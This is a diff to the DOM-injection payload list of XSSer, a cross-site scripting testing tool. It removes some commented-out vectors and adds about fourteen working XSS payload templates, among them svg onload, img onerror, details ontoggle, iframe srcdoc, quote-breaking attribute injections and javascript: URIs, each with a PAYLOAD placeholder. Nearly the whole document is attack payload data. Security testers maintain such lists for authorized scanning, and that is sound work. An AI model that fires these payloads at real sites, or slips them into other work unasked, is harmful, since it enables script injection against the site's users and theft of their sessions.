@@ -4,7 +4,7 @@
 """
 This file is part of the XSSer project, https://xsser.03c8.net
 
-Copyright (c) 2010/2020 | psy <epsylon@riseup.net>
+Copyright (c) 2010/2026 | psy <epsylon@riseup.net>
 
 xsser is free software; you can redistribute it and/or modify it under
 the terms of the GNU General Public License as published by the Free
@@ -24,16 +24,6 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 ## Happy Cross Hacking! ;)
 
 DOMvectors = [
-#		{ 'payload' : """?notname=PAYLOAD&""",
-#		  'browser' : """[Document Object Model Injection]"""},
-#		{ 'payload':'''<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="PAYLOAD" style="behavior:url(#x);"><param name=postdomevents /></object>''',
-#		  'browser' : """[Document Object Model Injection]"""},
-#		{ 'payload' : """?<script>history.pushState(0,0,'PAYLOAD');</script>""",
-#		  'browser' : """[Document Object Model Injection]"""},
-#		{ 'payload' : """?name=Y%0d%0a%0d%0aPAYLOAD""",
-#		  'browser' : """[Document Object Model Injection]"""}, 
-#		{ 'payload' : """?foobar=name=PAYLOAD&""",
-#		  'browser' : """[Document Object Model Injection]"""},
 		{ 'payload':"""Y#<script>alert('PAYLOAD')</script>""",
 		  'browser':"""[Document Object Model Injection]"""},
         { 'payload':"""Y#<%<!--'%><script>alert(PAYLOAD);</script -->""",
@@ -61,5 +51,31 @@ DOMvectors = [
         { 'payload':'''Y#%3Cscript>javascript:alert(PAYLOAD)</script>''',
           'browser':"""[Document Object Model Injection]"""},
         { 'payload':"""Y#<SCRIPT>a=/PAYLOAD/alert(a.source)</SCRIPT>""",
-          'browser':"""[Document Object Model Injection]"""}
+          'browser':"""[Document Object Model Injection]"""},
+        { 'payload':"""Y#<svg onload=PAYLOAD>""",
+          'browser':"""[Document Object Model Injection]"""},
+        { 'payload':"""Y#<img src=x onerror=PAYLOAD>""",
+          'browser':"""[Document Object Model Injection]"""},
+        { 'payload':"""Y#<details open ontoggle=PAYLOAD>""",
+          'browser':"""[Document Object Model Injection]"""},
+        { 'payload':"""Y#<video><source onerror=PAYLOAD>""",
+          'browser':"""[Document Object Model Injection]"""},
+        { 'payload':"""Y#<xss onfocus=PAYLOAD autofocus tabindex=1>""",
+          'browser':"""[Document Object Model Injection]"""},
+        { 'payload':"""Y#<iframe srcdoc="&lt;svg onload=PAYLOAD&gt;">""",
+          'browser':"""[Document Object Model Injection]"""},
+        { 'payload':"""Y#<svg><animate onbegin=PAYLOAD attributeName=x dur=1s>""",
+          'browser':"""[Document Object Model Injection]"""},
+        { 'payload':"""Y#javascript:PAYLOAD""",
+          'browser':"""[Document Object Model Injection]"""},
+        { 'payload':"""Y#x' onerror='alert(PAYLOAD)""",
+          'browser':"""[Document Object Model Injection]"""},
+        { 'payload':'''Y#x" onerror="alert(PAYLOAD)''',
+          'browser':"""[Document Object Model Injection]"""},
+        { 'payload':"""Y#'><img src=x onerror=alert(PAYLOAD)>""",
+          'browser':"""[Document Object Model Injection]"""},
+        { 'payload':'''Y#"><img src=x onerror=alert(PAYLOAD)>''',
+          'browser':"""[Document Object Model Injection]"""},
+        { 'payload':"""Y#javascript:alert(PAYLOAD)""",
+          'browser':"""[Document Object Model Injection]"""},
 		]
